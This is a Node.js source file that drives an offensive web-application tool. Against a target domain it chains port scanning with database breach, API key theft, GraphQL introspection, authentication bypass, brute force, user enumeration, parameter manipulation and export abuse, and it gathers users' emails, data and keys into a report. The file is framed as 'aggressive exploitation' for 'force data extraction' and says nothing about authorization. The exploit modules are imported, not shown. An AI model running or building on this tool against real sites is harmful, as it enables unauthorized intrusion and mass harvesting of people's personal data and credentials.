const axios = require('axios');
const logger = require('./utils/logger');
const { bruteForceAPI } = require('./exploits/api-brute-force');
const { enumerateUsers } = require('./exploits/user-enumeration');
const { extractAPIKeys } = require('./exploits/api-key-extraction');
const { testGraphQL } = require('./exploits/graphql-exploitation');
const { findExportFunctions } = require('./exploits/export-functions');
const { parameterManipulation } = require('./exploits/parameter-manipulation');
const { portScanAndBreach } = require('./exploits/port-scanner');
const { testAuthBypass } = require('./exploits/auth-bypass');

async function launchFullExploitation(domain) {
  console.log('\n╔════════════════════════════════════════════════════════════╗');
  console.log('║        🌑 AGGRESSIVE WEB APP EXPLOITATION INITIATED 🌑     ║');
  console.log(`║        Target: ${domain. padEnd(50)}║`);
  console.log('║        Mode:   FORCE DATA EXTRACTION                        ║');
  console.log('╚════════════════════════════════════════════════════════════╝\n');

  const report = {
    timestamp: new Date().toISOString(),
    domain,
    scanId: require('uuid').v4(),
    vulnerabilities: [],
    extractedEmails: [],
    extractedData: [],
    apiKeys: [],
    exploitedEndpoints: [],
    totalDataPoints: 0,
    severity: 'UNKNOWN'
  };

  try {
    // PHASE 1: Port Scanning
    console.log('🌑 PHASE 1: Port Scanning & Direct Database Breach\n');
    const portResults = await portScanAndBreach(domain);
    
    if (portResults.breached) {
      report.vulnerabilities.push(... portResults.vulnerabilities);
      report.extractedEmails. push(...portResults.emails);
      report.exploitedEndpoints.push({
        type: 'Direct Database Breach',
        port: portResults.port,
        database: portResults.dbType
      });
      console.log(`✅ [SUCCESS] Direct database breach!  ${portResults.emails.length} emails extracted\n`);
    } else {
      console.log('⚠️  No exposed database found, pivoting to API exploitation\n');
    }

    // PHASE 2: API Key Extraction
    console.log('🌑 PHASE 2: API Key & Secret Extraction\n');
    const keyResults = await extractAPIKeys(domain);
    report.apiKeys. push(...keyResults.keys);
    report.vulnerabilities.push(...keyResults.vulnerabilities);
    if (keyResults.keys.length > 0) {
      console.log(`✅ [SUCCESS] Found ${keyResults.keys.length} API keys\n`);
    }

    // PHASE 3: GraphQL Introspection
    console.log('🌑 PHASE 3: GraphQL Introspection & Query Exploitation\n');
    const graphqlResults = await testGraphQL(domain);
    if (graphqlResults.vulnerable) {
      report.extractedEmails.push(...graphqlResults. emails);
      report.vulnerabilities.push(...graphqlResults.vulnerabilities);
      report.exploitedEndpoints.push({
        type: 'GraphQL Introspection',
        endpoint: '/graphql',
        exposed: true
      });
      console.log(`✅ [SUCCESS] GraphQL introspection enabled!  ${graphqlResults.emails.length} emails\n`);
    }

    // PHASE 4: Authentication Bypass
    console.log('🌑 PHASE 4: Authentication Bypass & Default Credentials\n');
    const authResults = await testAuthBypass(domain);
    if (authResults.bypassed) {
      report.vulnerabilities.push(...authResults.vulnerabilities);
      report.exploitedEndpoints.push({
        type: 'Authentication Bypass',
        method: authResults.method,
        token: authResults.token
      });
      console.log(`✅ [SUCCESS] Authentication bypassed via ${authResults.method}\n`);
    }

    // PHASE 5: API Brute Force
    console. log('🌑 PHASE 5: API Endpoint Brute Force & Data Extraction\n');
    const apiResults = await bruteForceAPI(domain, authResults. token);
    report.extractedEmails.push(...apiResults.emails);
    report.extractedData.push(...apiResults. data);
    report.exploitedEndpoints.push(... apiResults.endpoints);
    report.vulnerabilities.push(...apiResults.vulnerabilities);
    if (apiResults.emails.length > 0) {
      console.log(`✅ [SUCCESS] API brute force found ${apiResults.emails.length} emails\n`);
    }

    // PHASE 6: User Enumeration
    console.log('🌑 PHASE 6: User ID Enumeration via Sequential Access\n');
    const enumResults = await enumerateUsers(domain, authResults.token);
    report.extractedEmails.push(...enumResults.emails);
    report.extractedData.push(...enumResults. data);
    report.vulnerabilities.push(...enumResults.vulnerabilities);
    if (enumResults. emails.length > 0) {
      console.log(`✅ [SUCCESS] User enumeration found ${enumResults.emails.length} emails\n`);
    }

    // PHASE 7: Parameter Manipulation
    console.log('🌑 PHASE 7: Parameter Manipulation & Bypass Techniques\n');
    const paramResults = await parameterManipulation(domain, authResults.token);
    report.extractedEmails.push(...paramResults.emails);
    report.vulnerabilities.push(...paramResults.vulnerabilities);
    if (paramResults.emails.length > 0) {
      console.log(`✅ [SUCCESS] Parameter manipulation found ${paramResults.emails.length} emails\n`);
    }

    // PHASE 8: Export Functions
    console.log('🌑 PHASE 8: Export Function Exploitation\n');
    const exportResults = await findExportFunctions(domain, authResults.token);
    report.extractedEmails.push(...exportResults.emails);
    report.extractedData.push(...exportResults. data);
    report.vulnerabilities.push(...exportResults.vulnerabilities);
    if (exportResults. emails.length > 0) {
      console.log(`✅ [SUCCESS] Export functions found ${exportResults.emails.length} emails\n`);
    }

    // Compile final results
    report.extractedEmails = [... new Set(report.extractedEmails)];
    report.totalDataPoints = report.extractedEmails.length + report.extractedData.length;

    // Determine severity
    if (report.extractedEmails.length > 1000) {
      report.severity = 'CRITICAL';
    } else if (report.extractedEmails.length > 100) {
      report.severity = 'HIGH';
    } else if (report.extractedEmails.length > 10) {
      report.severity = 'MEDIUM';
    } else if (report.extractedEmails. length > 0) {
      report.severity = 'LOW';
    } else {
      report.severity = 'NONE';
    }

    printExploitationReport(report);
    return report;

  } catch (error) {
    logger.error(`Exploitation failed:  ${error.message}`);
    throw error;
  }
}

function printExploitationReport(report) {
  console.log('\n╔════════════════════════════════════════════════════════════╗');
  console.log('║            🔓 EXPLOITATION REPORT 🔓                       ║');
  console.log('╠════════════════════════════════════════════════════════════╣');
  console.log(`║ Total Emails Extracted:        ${String(report.extractedEmails. length).padEnd(39)}║`);
  console.log(`║ Total Data Points:           ${String(report.totalDataPoints).padEnd(39)}║`);
  console.log(`║ Vulnerabilities Found:       ${String(report.vulnerabilities. length).padEnd(39)}║`);
  console.log(`║ Exploited Endpoints:         ${String(report.exploitedEndpoints. length).padEnd(39)}║`);
  console.log(`║ API Keys Extracted:          ${String(report.apiKeys.length).padEnd(39)}║`);
  console.log(`║ Overall Severity:            ${report.severity.padEnd(39)}║`);
  console.log('╠════════════════════════════════════════════════════════════╣');

  if (report.extractedEmails.length > 0) {
    console.log('║ SAMPLE EXTRACTED EMAILS:                                  ║');
    report.extractedEmails.slice(0, 15).forEach(email => {
      console.log(`║   • ${email.padEnd(55)}║`);
    });
    if (report.extractedEmails. length > 15) {
      console.log(`║   ... and ${(report.extractedEmails.length - 15)} more emails${' '.repeat(37)}║`);
    }
  }

  console.log('╠════════════════════════════════════════════════════════════╣');
  console.log('║ EXPLOITED VULNERABILITIES:                                ║');
  report.vulnerabilities.slice(0, 10).forEach(vuln => {
    console.log(`║   [${vuln.severity}] ${vuln.type.padEnd(47)}║`);
  });
  console.log('╚════════════════════════════════════════════════════════════╝\n');
}

module.exports = { launchFullExploitation };
